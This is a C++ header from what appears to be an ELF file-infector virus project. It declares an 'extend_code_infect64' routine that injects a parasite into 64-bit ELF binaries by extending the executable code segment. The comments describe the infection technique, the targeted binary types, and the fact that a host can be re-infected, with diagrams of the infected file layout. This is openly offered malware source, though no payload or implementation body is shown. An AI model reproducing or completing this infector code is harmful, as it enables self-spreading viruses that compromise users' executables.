#pragma once
#include "common/mmap.hh"

namespace vt::infector {
// This algorithm injects a parasite into where the last section of CODE segment
// is extended. It has the following characteristics:
//  - It infects 64 bit elfs.
//  - It infects ET_DYN (most common) and ET_EXEC.
//  - File size will be increased.
//  - Original host code is undamaged. It will still run.
//  - It's possible to infect an infected host again. In other words, caller
//    should handle skipping logic.
//
//  host elf structure            infected elf structure
//  -------------------           -----------------------
//  elf_hdr                       elf_hdr
//  phdrs                         phdrs
//  executale_sections            executale_sections
//  padding                       extension      <- virus inserted here
//  non-exec sections             padding
//  shdrs                         non-exec sections
//                                shdrs
//
// Because the sections in file has the same padding, inserting virus doesn't
// change file size.
//
//  infected elf segments
//  -------------------
//  LOAD RX
//    Ehdr
//    phdrs
//    interp
//    text
//    extension    <- virus here
//  PADDING
//  LOAD RW
//    .data
//    ...
bool extend_code_infect64(common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
                      common::Mmap<PROT_READ> parasite_mapping);

struct ExtendCodeInfect {
  static size_t output_size(size_t host_size, size_t parasite_size);
  bool operator()(common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
                  common::Mmap<PROT_READ> parasite_mapping) {
    return extend_code_infect64(vt::move(host_mapping), vt::move(parasite_mapping));
  }
};

}  // namespace vt::infector